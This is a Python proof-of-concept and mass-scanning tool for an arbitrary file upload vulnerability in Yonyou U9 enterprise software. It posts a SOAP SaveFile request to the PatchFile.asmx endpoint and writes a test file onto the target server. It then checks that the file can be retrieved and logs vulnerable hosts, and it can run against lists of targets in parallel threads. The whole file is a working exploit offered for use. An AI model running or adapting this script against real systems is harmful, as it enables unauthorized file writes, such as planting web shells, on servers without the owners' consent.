# -*- coding: utf-8 -*-
import argparse
import base64
import re
import sys
import json
from multiprocessing.dummy import Pool
import http.client
import requests
import urllib3
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def banner():
    test = """
           8b        d8   88           88      a8P  88 888b      88   ,ad8888ba,   
            Y8,    ,8P  ,d88           88    ,88' ,d88 8888b     88  d8"'    `"8b  
             Y8,  ,8P 888888           88  ,88" 888888 88 `8b    88 d8'            
              "8aa8"      88           88,d88'      88 88  `8b   88 88             
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                88        88           88P   Y8b    88 88    `8b 88 Y8,        88  
                88        88           88     "88,  88 88     `888   `"Y88888P"   

                            888888888888 

                                        tag: this is a 用友系统-U9企业版存在任意文件上传漏洞POC
                                              @version: 1.0.0   @author: Y1_K1NG           
    """
    print(test)


def poc(target):
    if target[-1] == '/':
        target = target[:-1]
    else:
        target = target
    path = "/CS/Office/AutoUpdates/PatchFile.asmx"
    url = target + path

    headers = {
        "Content-Type": "text/xml; charset=utf-8",
        "Content-Length": "433",
        "Cookie": ".ASPXANONYMOUS=1OJZqnZ03AEkAAAAZGQ2ZDU0NzYtMDdiZS00YWJhLTk2ZTMtNmRhYTgxNDM5OTNi0; ASP.NET_SessionId=md4bw5fgleu1cxfdwk4w0o4n",
        # 替换为实际的 Cookie 值
    }
    data = '''<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                   xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <SaveFile xmlns="http://tempuri.org/">
          <binData>VXBsb2FkLXN1Y2Nlc3NmdWxseQ==</binData>
          <path>./</path>
          <fileName>123.txt</fileName>
        </SaveFile>
      </soap:Body>
    </soap:Envelope>'''


    try:
        # conn = http.client.HTTPConnection(target)
        # conn.request("POST", path, body.encode("utf-8"), headers)
        # response1 = conn.getresponse()
        response1 = requests.post(url, headers=headers, data=data, verify=False, timeout=15)
        # print(response1.status_code)
        url2 = target + "/CS/Office/AutoUpdates/123.txt"
        response2 = requests.get(url=url2, headers=headers, verify=False, timeout=15)
        # print(response2.text)
        if response1.status_code == 200 :
            if  "successfully" in response2.text:
                print(f"[++++++] {target} 存在 任意文件上传,地址为{url2}")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                print(f"[-] {target} Failed")

        else:
            print(f"[-] {target} 不存在")
        # conn.close()
    except Exception as e:
        print(f"[*] {target} error: {str(e)}")


def extract_host(url):
    """
    从 URL 中提取主机地址和端口号，返回 (host, port)
    """
    match = re.search(r"(http://|https://)?([\w\.]+):?(\d+)?", url)
    if match:
        prefix, host, port = match.groups()
        if not port:
            if prefix and "https" in prefix:
                port = "443"
            else:
                port = "80"
        return host, int(port)
    else:
        return None, None


def main():
    banner()
    parser = argparse.ArgumentParser(description='任何问题+V y1k1ng1227')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()

    if args.url and not args.file:
        if "https://" in args.url or "http://" in args.url:
            url = args.url
        else:
            host, port = extract_host(args.url)
            url = f"http://{host}:{port}"
        poc(url)

    elif args.url is None and args.file is not None:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url = url.strip().replace("\n", "")
                if "https://" in url or "http://" in url:
                    url = url
                else:
                    host, port = extract_host(url)
                    url = f"http://{host}:{port}"
                url_list.append(url)

        pool = Pool(10)
        pool.map(poc, url_list)
        pool.close()
        pool.join()

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
